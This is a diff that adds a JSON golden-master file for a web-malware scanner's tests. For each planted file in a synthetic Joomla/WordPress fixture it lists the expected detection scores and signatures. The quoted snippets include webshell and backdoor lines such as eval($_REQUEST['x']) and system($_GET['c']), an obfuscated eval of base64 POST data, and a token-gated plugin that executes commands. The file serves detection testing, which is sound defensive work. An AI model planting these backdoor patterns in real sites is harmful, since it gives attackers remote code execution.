@@ -1,0 +1,448 @@
+{
+ "_comment": "Detection golden master for the planted synthetic fixture (tests/fixtures_sites.py). Re-record only for an intentional detection change: python tools/record_golden.py",
+ "corpus": "fixtures_sites.build('planted=True') with every PLANTED sample readable",
+ "expected": {
+  "files": [
+   {
+    "path": ".htaccess",
+    "score": 34,
+    "verdict": "HIGH",
+    "size": 423,
+    "sha256": "afcca5b4e989677b2c41a059e4d68626dcabc862b40c4e18c5182e5bc900f75d",
+    "counts": {
+     "[CRITICAL]": 1,
+     "[OBFUSCATED]": 1
+    },
+    "hidden_hits": 0,
+    "hits": [
+     {
+      "severity": "[CRITICAL]",
+      "line": 2,
+      "signature": "known malicious .htaccess template (deny all PHP except a list)",
+      "snippet": "<FilesMatch \"(?i)\\.(py|exe|php|PHP|Php|PHp|pHp|pHP|phP|pH|ph)$\">"
+     },
+     {
+      "severity": "[OBFUSCATED]",
+      "line": 2,
+      "signature": "FilesMatch denies PHP execution (check what is allowed)",
+      "snippet": "<FilesMatch \"(?i)\\.(py|exe|php|PHP|Php|PHp|pHp|pHP|phP|pH|ph)$\">"
+     }
+    ]
+   },
+   {
+    "path": "administrator/components/com_banners/helpers/filefuns.php",
+    "score": 105,
+    "verdict": "HIGH",
+    "size": 187,
+    "sha256": "39018f5bc3407a6cc6f12c9cd614f1bed0ac9e355791bf403f0646b3e1058fe3",
+    "counts": {
+     "[OBFUSCATED]": 5,
+     "[CRITICAL]": 3,
+     "[WARNING]": 3
+    },
+    "hidden_hits": 0,
+    "hits": [
+     {
+      "severity": "[CRITICAL]",
+      "line": 5,
+      "signature": "base64_decode(request data)",
+      "snippet": "$B = base64_decode($_POST['z']);"
+     },
+     {
+      "severity": "[CRITICAL]",
+      "line": 6,
+      "signature": "eval(function from an array element)",
+      "snippet": "eval($A[0]($B));"
+     },
+     {
+      "severity": "[CRITICAL]",
+      "line": 9,
+      "signature": "infection marker 'BiaoJiOk' (backdoor family)",
+      "snippet": "echo \"BiaoJiOk\";"
+     },
+     {
+      "severity": "[OBFUSCATED]",
+      "line": 0,
+      "signature": "filename from a known malicious .htaccess allow-list",
+      "snippet": "filefuns.php"
+     },
+     {
+      "severity": "[OBFUSCATED]",
+      "line": 2,
+      "signature": "chr(N).chr(N)... building a string from printable codes",
+      "snippet": "$A = array(chr(101) . chr(118) . chr(97) . chr(108), chr(103) . chr(122) . chr(105));"
+     },
+     {
+      "severity": "[OBFUSCATED]",
+      "line": 3,
+      "signature": "goto (obfuscation)",
+      "snippet": "goto K3f;"
+     },
+     {
+      "severity": "[OBFUSCATED]",
+      "line": 6,
+      "signature": "eval($variable)",
+      "snippet": "eval($A[0]($B));"
+     },
+     {
+      "severity": "[OBFUSCATED]",
+      "line": 7,
+      "signature": "goto (obfuscation)",
+      "snippet": "goto Z9;"
+     },
+     {
+      "severity": "[WARNING]",
+      "line": 2,
+      "signature": "chr(",
+      "snippet": "$A = array(chr(101) . chr(118) . chr(97) . chr(108), chr(103) . chr(122) . chr(105));"
+     },
+     {
+      "severity": "[WARNING]",
+      "line": 5,
+      "signature": "$_POST",
+      "snippet": "$B = base64_decode($_POST['z']);"
+     },
+     {
+      "severity": "[WARNING]",
+      "line": 6,
+      "signature": "eval(",
+      "snippet": "eval($A[0]($B));"
+     }
+    ]
+   },
+   {
+    "path": "c99_madnet.php",
+    "score": 25,
+    "verdict": "HIGH",
+    "size": 51,
+    "sha256": "7eb88f952f106ba07cf0ecb7a4e4cb8fb28be7855996884fbc7896192c376fdb",
+    "counts": {
+     "[CRITICAL]": 1
+    },
+    "hidden_hits": 0,
+    "hits": [
+     {
+      "severity": "[CRITICAL]",
+      "line": 0,
+      "signature": "typical webshell filename",
+      "snippet": "c99_madnet.php"
+     }
+    ]
+   },
+   {
+    "path": "configuration.php",
+    "score": 59,
+    "verdict": "HIGH",
+    "size": 476,
+    "sha256": "d5268843ea8c090b6a4ee5d3a2b122abae24ec9b7bcb2b115f270e4a0c1fcc6c",
+    "counts": {
+     "[CRITICAL]": 2,
+     "[OBFUSCATED]": 1,
+     "[WARNING]": 1
+    },
+    "hidden_hits": 0,
+    "hits": [
+     {
+      "severity": "[CRITICAL]",
+      "line": 0,
+      "signature": "code AFTER class JConfig in configuration.php",
+      "snippet": "if (isset($_REQUEST['x'])) { eval($_REQUEST['x']); }"
+     },
+     {
+      "severity": "[CRITICAL]",
+      "line": 17,
+      "signature": "eval(request data)",
+      "snippet": "if (isset($_REQUEST['x'])) { eval($_REQUEST['x']); }"
+     },
+     {
+      "severity": "[OBFUSCATED]",
+      "line": 17,
+      "signature": "eval($variable)",
+      "snippet": "if (isset($_REQUEST['x'])) { eval($_REQUEST['x']); }"
+     },
+     {
+      "severity": "[WARNING]",
+      "line": 17,
+      "signature": "eval(",
+      "snippet": "if (isset($_REQUEST['x'])) { eval($_REQUEST['x']); }"
+     }
+    ]
+   },
+   {
+    "path": "connector-filemanager.php",
+    "score": 38,
+    "verdict": "HIGH",
+    "size": 377,
+    "sha256": "841a56f4f99ffb414832e524ce5184e7e20d7b2f8ac655c95e56db38d41bed5e",
+    "counts": {
+     "[CRITICAL]": 2,
+     "[WARNING]": 3
+    },
+    "hidden_hits": 0,
+    "hits": [
+     {
+      "severity": "[CRITICAL]",
+      "line": 0,
+      "signature": "web file manager / webshell behaviour (list dirs, upload, delete, rename, write, read, perms) driven by request parameters",
+      "snippet": ""
+     },
+     {
+      "severity": "[CRITICAL]",
+      "line": 11,
+      "signature": "file write with request data",
+      "snippet": "file_put_contents($dir . '/c.txt', file_get_contents($_GET['src']));"
+     },
+     {
+      "severity": "[WARNING]",
+      "line": 2,
+      "signature": "$_GET",
+      "snippet": "$dir = isset($_GET['dir']) ? $_GET['dir'] : '.';"
+     },
+     {
+      "severity": "[WARNING]",
+      "line": 7,
+      "signature": "move_uploaded_file(",
+      "snippet": "move_uploaded_file($_FILES['up']['tmp_name'], $dir . '/' . $_FILES['up']['name']);"
+     },
+     {
+      "severity": "[WARNING]",
+      "line": 11,
+      "signature": "$_GET",
+      "snippet": "file_put_contents($dir . '/c.txt', file_get_contents($_GET['src']));"
+     }
+    ]
+   },
+   {
+    "path": "connector-up.php",
+    "score": 52,
+    "verdict": "HIGH",
+    "size": 173,
+    "sha256": "9214578c7972f9d53160dc00049761226de95727165f5b7577dcfb1c49dd871e",
+    "counts": {
+     "[CRITICAL]": 2,
+     "[WARNING]": 2
+    },
+    "hidden_hits": 0,
+    "hits": [
+     {
+      "severity": "[CRITICAL]",
+      "line": 4,
+      "signature": "file write/copy to a path from request data",
+      "snippet": "copy($HTTP_POST_FILES['file']['tmp_name'], $_POST['remotefile']);"
+     },
+     {
+      "severity": "[CRITICAL]",
+      "line": 5,
+      "signature": "file write/copy to a path from request data",
+      "snippet": "chmod($_POST['remotefile'], 0777);"
+     },
+     {
+      "severity": "[WARNING]",
+      "line": 4,
+      "signature": "$_POST",
+      "snippet": "copy($HTTP_POST_FILES['file']['tmp_name'], $_POST['remotefile']);"
+     },
+     {
+      "severity": "[WARNING]",
+      "line": 5,
+      "signature": "$_POST",
+      "snippet": "chmod($_POST['remotefile'], 0777);"
+     }
+    ]
+   },
+   {
+    "path": "media/system/js/jquery.min.js",
+    "score": 19,
+    "verdict": "MEDIUM",
+    "size": 434,
+    "sha256": "293c87116cf7bbe1226b8efd1f65710e0cb51a2fb5202b5ec25d304f2bfc74fd",
+    "counts": {
+     "[CRITICAL]": 1,
+     "[OBFUSCATED]": 1,
+     "[WARNING]": 1
+    },
+    "hidden_hits": 0,
+    "hits": [
+     {
+      "severity": "[CRITICAL]",
+      "line": 13,
+      "signature": "JS packer eval(function(p,a,c,k,e,d))",
+      "snippet": "eval(function (p, a, c, k, e, d) {"
+     },
+     {
+      "severity": "[OBFUSCATED]",
+      "line": 12,
+      "signature": "atob / unescape",
+      "snippet": "}(unescape('J%756e%74'), 62, [], 'split'.['charCodeAt'](0) + 0, 0, 0));"
+     },
+     {
+      "severity": "[WARNING]",
+      "line": 13,
+      "signature": "eval(",
+      "snippet": "eval(function (p, a, c, k, e, d) {"
+     }
+    ]
+   },
+   {
+    "path": "templates/protostar/html/tpl.php.jpg",
+    "score": 51,
+    "verdict": "HIGH",
+    "size": 29,
+    "sha256": "23d25d1d87093115f59e0e58f3894aceeb48e9c151ae8d3364aaf37b716f2bf3",
+    "counts": {
+     "[CRITICAL]": 2,
+     "[WARNING]": 1
+    },
+    "hidden_hits": 0,
+    "hits": [
+     {
+      "severity": "[CRITICAL]",
+      "line": 0,
+      "signature": "double extension (.php.xxx)",
+      "snippet": "tpl.php.jpg"
+     },
+     {
+      "severity": "[CRITICAL]",
+      "line": 1,
+      "signature": "system/exec(request data)",
+      "snippet": "<?php system($_GET['c']); ?>"
+     },
+     {
+      "severity": "[WARNING]",
+      "line": 1,
+      "signature": "$_GET",
+      "snippet": "<?php system($_GET['c']); ?>"
+     }
+    ]
+   },
+   {
+    "path": "tmp/fetch_lfi.php",
+    "score": 34,
+    "verdict": "HIGH",
+    "size": 292,
+    "sha256": "5f250bf6ba55b097c9a2e6fd539800412188602ddfa2942afa113207e3b33afc",
+    "counts": {
+     "[CRITICAL]": 1,
+     "[OBFUSCATED]": 1,
+     "[WARNING]": 1
+    },
+    "hidden_hits": 0,
+    "hits": [
+     {
+      "severity": "[CRITICAL]",
+      "line": 0,
+      "signature": "PHP file in /tmp/ (must not exist there)",
+      "snippet": "tmp/fetch_lfi.php"
+     },
+     {
+      "severity": "[OBFUSCATED]",
+      "line": 3,
+      "signature": "file function fed by a variable from request data",
+      "snippet": "$fichero = $_GET['file'];"
+     },
+     {
+      "severity": "[WARNING]",
+      "line": 3,
+      "signature": "$_GET",
+      "snippet": "$fichero = $_GET['file'];"
+     }
+    ]
+   },
+   {
+    "path": "tmp/media_view.php",
+    "score": 28,
+    "verdict": "HIGH",
+    "size": 154,
+    "sha256": "25bdf74181d38c22659ff39ce66b26d9bc025283064b6bcbab94396485e8791f",
+    "counts": {
+     "[CRITICAL]": 1,
+     "[OBFUSCATED]": 1
+    },
+    "hidden_hits": 0,
+    "hits": [
+     {
+      "severity": "[CRITICAL]",
+      "line": 0,
+      "signature": "PHP file in /tmp/ (must not exist there)",
+      "snippet": "tmp/media_view.php"
+     },
+     {
+      "severity": "[OBFUSCATED]",
+      "line": 2,
+      "signature": "error_reporting(0)",
+      "snippet": "error_reporting(0);"
+     }
+    ]
+   },
+   {
+    "path": "wp-content/plugins/wpeditor-1a2b3c/wpeditor-1a2b3c.php",
+    "score": 58,
+    "verdict": "HIGH",
+    "size": 462,
+    "sha256": "ae0a3a5a7eb342b6cc331d6dad4ba37ab0fa7ac2bddb0f667b68becaf2eef8c6",
+    "counts": {
+     "[OBFUSCATED]": 4,
+     "[CRITICAL]": 1,
+     "[WARNING]": 4
+    },
+    "hidden_hits": 0,
+    "hits": [
+     {
+      "severity": "[CRITICAL]",
+      "line": 15,
+      "signature": "exec sink fed by a variable from request data",
+      "snippet": "$cmd = $_GET['c'];"
+     },
+     {
+      "severity": "[OBFUSCATED]",
+      "line": 0,
+      "signature": "plugin folder named like a campaign drop (<name>-<6 hex> suffix)",
+      "snippet": "wp-content/plugins/wpeditor-1a2b3c/wpeditor-1a2b3c.php"
+     },
+     {
+      "severity": "[OBFUSCATED]",
+      "line": 6,
+      "signature": "plugin header claims 'WordPress.org Community' authorship (impersonation)",
+      "snippet": "* Author: WordPress.org Community"
+     },
+     {
+      "severity": "[OBFUSCATED]",
+      "line": 14,
+      "signature": "hash_equals() comparing against request data (token-gated backdoor)",
+      "snippet": "if ( isset( $_GET['t'], $_GET['c'] ) && hash_equals( $key, $_GET['t'] ) ) {"
+     },
+     {
+      "severity": "[OBFUSCATED]",
+      "line": 17,
+      "signature": "error_reporting(0)",
+      "snippet": "error_reporting( 0 );"
+     },
+     {
+      "severity": "[WARNING]",
+      "line": 14,
+      "signature": "$_GET",
+      "snippet": "if ( isset( $_GET['t'], $_GET['c'] ) && hash_equals( $key, $_GET['t'] ) ) {"
+     },
+     {
+      "severity": "[WARNING]",
+      "line": 15,
+      "signature": "$_GET",
+      "snippet": "$cmd = $_GET['c'];"
+     },
+     {
+      "severity": "[WARNING]",
+      "line": 16,
+      "signature": "set_time_limit(0)",
+      "snippet": "@set_time_limit( 0 );"
+     },
+     {
+      "severity": "[WARNING]",
+      "line": 19,
+      "signature": "system(",
+      "snippet": "system( $cmd );"
+     }
+    ]
+   }
+  ]
+ }
+}
